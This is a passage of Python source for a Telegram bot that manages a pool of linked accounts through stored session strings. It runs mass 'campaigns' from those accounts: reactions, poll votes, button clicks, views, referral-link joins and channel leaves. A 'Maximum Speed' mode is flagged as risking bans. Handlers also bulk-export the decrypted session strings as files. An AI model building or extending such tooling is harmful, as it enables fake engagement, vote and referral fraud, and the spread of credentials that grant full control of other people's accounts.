    set_user_state(user_id, "selecting_multi")

@app.on_callback_query(filters.regex("^toggle_ex_ph:"))
async def handle_toggle_export_ph(client: Client, callback: CallbackQuery):
    await callback.answer()
    parts = callback.data.split(":")
    ph = parts[1]
    page = int(parts[2])
    user_id = callback.from_user.id
    
    _, fsm_data = get_user_state(user_id)
    selected = fsm_data.get("multi_export_selected", [])
    
    if ph in selected:
        selected.remove(ph)
    else:
        selected.append(ph)
        
    set_user_state(user_id, "selecting_multi", {"multi_export_selected": selected})
    
    callback.data = f"export_multi_start:{page}"
    await export_multi_dashboard(client, callback)

@app.on_callback_query(filters.regex("^execute_multi_export$"))
async def execute_multi_export(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    _, fsm_data = get_user_state(user_id)
    selected = fsm_data.get("multi_export_selected", [])
    
    if not selected:
        await callback.answer("⚠️ You must pick at least 1 destination target account profile.", show_alert=True)
        return
        
    await callback.answer()
    export_payload = []
    role = await db_mgr.get_user_role(user_id)
    
    for ph in selected:
        row = await db_mgr.accounts.find_one({"phone": ph})
        if row:
            if row["user_id"] in config.SUPER_OWNER_IDS and role != "super_owner":
                continue
            export_payload.append({
                "phone": row["phone"],
                "user_id": row["user_id"],
                "username": row.get("username", "None"),
                "session_string": decrypt_data(row["session_string"])
            })
                    
    temp_filename = "multi_sessions_bundle.txt"
    with open(temp_filename, "w", encoding="utf-8") as f:
        json.dump(export_payload, f, indent=4)
        
    await callback.message.reply_document(document=temp_filename, caption=f"✨ <b>Pack extraction compiled!</b> Successfully consolidated <code>{len(export_payload)}</code> customized database session rows.", parse_mode=enums.ParseMode.HTML)
    if os.path.exists(temp_filename):
        os.remove(temp_filename)
    clear_user_state(user_id)

@app.on_callback_query(filters.regex("^bulk_admin_export$"))
async def handle_bulk_admin_export(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    await callback.answer()
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await callback.message.reply_text("🚫 Clearances credential criteria missing.")
        return

    if role == "super_owner":
        cursor = db_mgr.accounts.find({"status": "active"})
    else:
        cursor = db_mgr.accounts.find({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}})
    
    rows = [doc async for doc in cursor]

    if not rows:
        await callback.message.reply_text("⚠️ Datastore registries do not match current scope rules filters.")
        return

    export_payload = []
    for r in rows:
        export_payload.append({
            "phone": r["phone"],
            "user_id": r["user_id"],
            "username": r.get("username", "None"),
            "session_string": decrypt_data(r["session_string"])
        })

    temp_filename = "bulk_admin_sessions.txt"
    with open(temp_filename, "w", encoding="utf-8") as f:
        json.dump(export_payload, f, indent=4)

    await callback.message.reply_document(document=temp_filename, caption=f"📦 <b>Master Datastore Core Bulk Extract Dump Complete!</b> Catalogued <code>{len(export_payload)}</code> active network session nodes safely.", parse_mode=enums.ParseMode.HTML)
    if os.path.exists(temp_filename):
        os.remove(temp_filename)

# --- DYNAMIC DB SNAPSHOT ENGINE ---
@app.on_callback_query(filters.regex("^backup_panel$"))
async def backup_panel(client: Client, callback: CallbackQuery):
    await callback.answer()
    buttons = [
        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]
    ]
    await callback.message.edit_text("💾 <b>MongoDB Core Cloud Database Maintenance Console</b>\n\nMongoDB stores data directly in cloud databases. Managed via admin dashboard.", reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)

# --- TASK WIZARD INTERFACE FLOW ---
@app.on_callback_query(filters.regex("^task_hub_start$"))
async def task_hub_select_type(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    clear_user_state(user_id)
    
    role = await db_mgr.get_user_role(user_id)
    if role in ["owner", "super_owner", "admin"]:
        active_count = await db_mgr.accounts.count_documents({"status": "active"})
    else:
        assigned_phones = [doc["phone"] async for doc in db_mgr.assignments.find({"user_id": user_id})]
        active_count = await db_mgr.accounts.count_documents({
            "status": "active",
            "$or": [{"user_id": user_id}, {"phone": {"$in": assigned_phones}}]
        })

    wizard_text = (
        f"🚀 <b>Premium Interactive Campaign Configuration Wizard Hub</b>\n"
        f"----------------------------------------------------\n"
        f"📱 Status: <code>{active_count}</code> active functional telephony slots mapped.\n\n"
        f"<b>Step 1: Pick the action protocol code matrix to deploy:</b>"
    )
    await callback.message.edit_text(text=wizard_text, reply_markup=get_task_types_keyboard(active_count), parse_mode=enums.ParseMode.HTML)
    set_user_state(user_id, "choosing_type")

@app.on_callback_query(filters.regex("^set_type:"))
async def task_hub_process_type(client: Client, callback: CallbackQuery):
    await callback.answer()
    task_type = callback.data.split(":")[1]
    user_id = callback.from_user.id
    set_user_state(user_id, "choosing_type", {"task_type": task_type})
    
    role = await db_mgr.get_user_role(user_id)

    if role == "super_owner":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="💎 Use our ids only", callback_data="set_routing:own")],
            [InlineKeyboardButton(text="👑 Use all ids", callback_data="set_routing:all")]
        ])
        await callback.message.edit_text("<b>👑 Super Owner Privileges Triggered:</b> Select account deployment routing orientation scope:", reply_markup=kb, parse_mode=enums.ParseMode.HTML)
        set_user_state(user_id, "waiting_for_routing_choice")
    else:
        set_user_state(user_id, "waiting_for_routing_choice", {"account_routing": "own"})
        await proceed_to_speed_selection(callback.message, user_id)

@app.on_callback_query(filters.regex("^set_routing:"))
async def task_hub_process_routing(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    routing = callback.data.split(":")[1]
    set_user_state(user_id, "waiting_for_routing_choice", {"account_routing": routing})
    await proceed_to_speed_selection(callback.message, user_id)

async def proceed_to_speed_selection(message: Message, user_id: int):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🟢 Safer Speed (5.0s)", callback_data="set_speed:safe")],
        [InlineKeyboardButton(text="🟡 Accelerated Speed (2.5s)", callback_data="set_speed:safer")],
        [InlineKeyboardButton(text="🔴 Maximum Speed (0.05s) [Ban Risk]", callback_data="set_speed:fastest")]
    ])
    await message.edit_text("<b>Step 1b: Configure Task execution delay speed matrix limits:</b>", reply_markup=kb, parse_mode=enums.ParseMode.HTML)
    set_user_state(user_id, "waiting_for_speed_choice")

@app.on_callback_query(filters.regex("^set_speed:"))
async def task_hub_process_speed(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    speed_mode = callback.data.split(":")[1]
    set_user_state(user_id, "waiting_for_speed_choice", {"speed_mode": speed_mode})
    
    _, data = get_user_state(user_id)
    task_type = data.get("task_type")

    if task_type == "leave":
        await callback.message.edit_text(
            "<b>Step 2: Choose evacuation strategy profile:</b>", 
            reply_markup=get_leave_channel_options_keyboard(),
            parse_mode=enums.ParseMode.HTML
        )
        set_user_state(user_id, "waiting_for_leave_choice")
    elif "react" in task_type or "vote" in task_type or task_type in ["view", "speed"]:
        await callback.message.edit_text("<b>Step 2: Provide targeted public handle destination or private link reference (e.g. @channelname or -100xxxxx):</b>", parse_mode=enums.ParseMode.HTML)
        set_user_state(user_id, "waiting_for_channel_link")
    elif task_type == "refer":
        await callback.message.edit_text("<b>Step 2: Input target referral link parameter query string value (Example: https://t.me/Bot?start=123):</b>", parse_mode=enums.ParseMode.HTML)
        set_user_state(user_id, "waiting_for_post_link")
    else:
        await callback.message.edit_text("<b>Step 2: Enter destination community target endpoint path link or channel ID:</b>", parse_mode=enums.ParseMode.HTML)
        set_user_state(user_id, "waiting_for_post_link")

@app.on_callback_query(filters.regex("^leave_mode:"))
async def task_hub_process_leave_choice(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    mode = callback.data.split(":")[1]
    set_user_state(user_id, "waiting_for_leave_choice", {"leave_mode": mode})

    if mode == "all":
        set_user_state(user_id, "waiting_for_leave_choice", {"target": "ALL CHANNELS"})
        await prompt_for_account_scale(callback.message)
    else:
        await callback.message.edit_text("<b>Step 3: Paste public link, private channel invite code, or numeric channel ID:</b>", parse_mode=enums.ParseMode.HTML)
        set_user_state(user_id, "waiting_for_post_link")

@app.on_callback_query(filters.regex("^set_vmode:"))
async def handle_vote_mode_choice(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    mode = callback.data.split(":")[1]
    set_user_state(user_id, "waiting_for_vote_mode_choice", {"vote_mode": mode})

    if mode == "poll":
        await callback.message.edit_text("<b>Step 4a: Enter 0-based Poll Option Index to click (e.g. 0 for first option, 1 for second option):</b>", parse_mode=enums.ParseMode.HTML)
        set_user_state(user_id, "waiting_for_poll_option_index")
    else:
        await callback.message.edit_text("<b>Step 4a: Enter exact target button text string to match inline callback button:</b>", parse_mode=enums.ParseMode.HTML)
        set_user_state(user_id, "waiting_for_button_text")

@app.on_callback_query(filters.regex("^toggle_emoji:"))
async def handle_toggle_emoji(client: Client, callback: CallbackQuery):
    await callback.answer()
    emoji = callback.data.split(":")[1]
    user_id = callback.from_user.id

    _, fsm_data = get_user_state(user_id)
    selected = fsm_data.get("selected_emojis", [])

    if emoji in selected:
        selected.remove(emoji)
    else:
        selected.append(emoji)

    set_user_state(user_id, "waiting_for_emojis", {"selected_emojis": selected})
    await callback.message.edit_reply_markup(reply_markup=get_emoji_selection_keyboard(selected))

@app.on_callback_query(filters.regex("^finish_emoji_selection$"))
async def handle_finish_emoji_selection(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    _, fsm_data = get_user_state(user_id)
    selected = fsm_data.get("selected_emojis", [])

    if not selected:
        set_user_state(user_id, "waiting_for_emojis", {"reactions": ["👍"]})
    else:
        set_user_state(user_id, "waiting_for_emojis", {"reactions": selected})

    await prompt_for_account_scale(callback.message)

@app.on_callback_query(filters.regex("^view_tasks$"))
async def handle_view_tasks(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)

    if role in ["owner", "super_owner"]:
        cursor = db_mgr.tasks.find({}).sort("created_at", -1).limit(10)
    else:
        cursor = db_mgr.tasks.find({"creator_id": user_id}).sort("created_at", -1).limit(10)

    rows = [doc async for doc in cursor]

    text = "📊 <b>Recent Campaign Logs Matrix</b>\n\n"
    if not rows:
        text += "<i>No recent campaign tasks registered.</i>"
    else:
        for r in rows:
            st = r.get("status", "pending")
            badge = "🟢" if st == "completed" else ("🟡" if st == "running" else "🔴")
            text += f"{badge} Task ID: <code>#{r['_id']}</code> | Type: <b>{r.get('task_type', 'N/A').upper()}</b>\nStatus: <code>{st.upper()}</code> ({r.get('progress', '0%')})\n\n"

    buttons = [[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")]]
    await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex("^view_referrals$"))
async def handle_view_referrals(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    ref_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
    ref_count = await db_mgr.users.count_documents({"referred_by": user_id})

    text = (
        f"⚜️ <b>Referral System Module</b>\n\n"
        f"Share your link to invite new system operators:\n"
        f"<code>{ref_link}</code>\n\n"
        f"👥 Total Referred Users: <code>{ref_count}</code>"
    )
    buttons = [[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")]]
    await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)

# --- ENHANCED INTERACTIVE ADMIN PANEL ---
@app.on_callback_query(filters.regex("^admin_panel$"))
async def handle_admin_panel(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)

    if role not in ["admin", "owner", "super_owner"]:
        await callback.answer("🚫 Unauthorized action.", show_alert=True)
        return

    await callback.answer()
    text = (
        f"🛡️ <b>Administrator Management Core Panel</b>\n\n"
        f"Your system role: <b>{role.upper()}</b>\n"
        f"Select system administrative action below:"
    )
    
    buttons = [
        [InlineKeyboardButton(text="🔑 Grant Account Access", callback_data="btn_grant_access_start"), InlineKeyboardButton(text="🔄 Reset Account Access", callback_data="btn_reset_access_start")],
        [InlineKeyboardButton(text="👑 Promote Admin", callback_data="btn_add_admin_start"), InlineKeyboardButton(text="📉 Demote Admin", callback_data="btn_remove_admin_start")],
        [InlineKeyboardButton(text="💾 Database Storage Telemetry", callback_data="btn_db_storage")],
        [InlineKeyboardButton(text="📢 Global User Broadcast", callback_data="btn_start_broadcast")],
        [InlineKeyboardButton(text="🛑 Abort All Tasks", callback_data="btn_abort_all_tasks")],
        [InlineKeyboardButton(text="💥 Complete Database Purge", callback_data="confirm_purge_database")],
        [InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")]
    ]
    await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex("^btn_grant_access_start$"))
async def handle_btn_grant_access_start(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    set_user_state(user_id, "waiting_for_grant_uid")
    await callback.message.edit_text("👤 <b>Enter Target User ID to Grant Access:</b>\n<i>(Or send command <code>/grantaccess &lt;user_id&gt; [count]</code>)</i>", parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex("^btn_reset_access_start$"))
async def handle_btn_reset_access_start(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    set_user_state(user_id, "waiting_for_reset_uid")
    await callback.message.edit_text("🔄 <b>Enter Target User ID to Reset / Revoke Access:</b>\n<i>(Or send command <code>/revokeaccess &lt;user_id&gt;</code>)</i>", parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex("^btn_add_admin_start$"))
async def handle_btn_add_admin_start(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await callback.answer("⚠️ Only Super Owner or Owner can promote admins.", show_alert=True)
        return
    await callback.answer()
    set_user_state(user_id, "waiting_for_addadmin_uid")
    await callback.message.edit_text("👑 <b>Enter Target User ID to Promote to Admin:</b>\n<i>(Or send command <code>/addadmin &lt;user_id&gt;</code>)</i>", parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex("^btn_remove_admin_start$"))
async def handle_btn_remove_admin_start(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await callback.answer("⚠️ Only Super Owner or Owner can demote admins.", show_alert=True)
        return
    await callback.answer()
    set_user_state(user_id, "waiting_for_removeadmin_uid")
    await callback.message.edit_text("📉 <b>Enter Target Admin User ID to Demote:</b>\n<i>(Or send command <code>/removeadmin &lt;user_id&gt;</code>)</i>", parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex("^btn_db_storage$"))
async def handle_btn_db_storage(client: Client, callback: CallbackQuery):
    await callback.answer()
    stats = await db_mgr.get_storage_stats()
    total_mb = stats["total_size"] / (1024 * 1024)
    data_mb = stats["data_size"] / (1024 * 1024)
    
    text = (
        f"💾 <b>MongoDB Real-Time Storage Telemetry Matrix</b>\n\n"
        f"📊 <b>Total Database Size:</b> <code>{total_mb:.2f} MB</code>\n"
        f"📁 <b>Uncompressed Payload:</b> <code>{data_mb:.2f} MB</code>\n"
        f"📦 <b>Total Document Objects:</b> <code>{stats['objects']}</code>"
    )
    await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="🔙 Admin Panel", callback_data="admin_panel")]]), parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex("^btn_start_broadcast$"))
async def handle_btn_start_broadcast(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    await callback.message.edit_text("📢 <b>Input text or multimedia payload content to broadcast:</b>", parse_mode=enums.ParseMode.HTML)
    set_user_state(user_id, "waiting_for_broadcast_msg")

@app.on_callback_query(filters.regex("^btn_abort_all_tasks$"))
async def handle_btn_abort_all_tasks(client: Client, callback: CallbackQuery):
    await callback.answer()
    killed_count = await task_queue.cancel_all_active_tasks()
    await db_mgr.tasks.update_many(
        {"$or": [{"status": "pending"}, {"status": "running"}]},
        {"$set": {"status": "cancelled"}}
    )
    await callback.message.edit_text(f"🛑 <b>Tasks Terminated!</b> Aborted <code>{killed_count}</code> task processes.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="🔙 Admin Panel", callback_data="admin_panel")]]), parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex("^system_stats$"))
async def handle_system_stats(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)

    if role not in ["owner", "super_owner"]:
        await callback.message.reply_text("🚫 Privilege violation.")
        return

    total_users = await db_mgr.users.count_documents({})
    total_accounts = await db_mgr.accounts.count_documents({})
    active_accounts = await db_mgr.accounts.count_documents({"status": "active"})
    dead_accounts = await db_mgr.accounts.count_documents({"status": "dead"})

    text = (
        f"📈 <b>System Statistics & Metrics</b>\n\n"
        f"👤 Total Registered System Users: <code>{total_users}</code>\n"
        f"📱 Total Linked Accounts Pool: <code>{total_accounts}</code>\n"
        f"🟢 Active Operational Accounts: <code>{active_accounts}</code>\n"
        f"🔴 Dead / Expired Session Keys: <code>{dead_accounts}</code>"
    )
    buttons = [[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")]]
    await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)

# --- APPLICATION ENTRY POINT ---
async def main():
    global bot_username
    await db_mgr.init()
    asyncio.create_task(task_queue.start_worker())
    
    await app.start()
    me = await app.get_me()
    bot_username = me.username or "bot"
    logger.info(f"Bot started successfully as @{bot_username}")
    
    await asyncio.Event().wait()

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        logger.info("Bot execution loop stopped.")
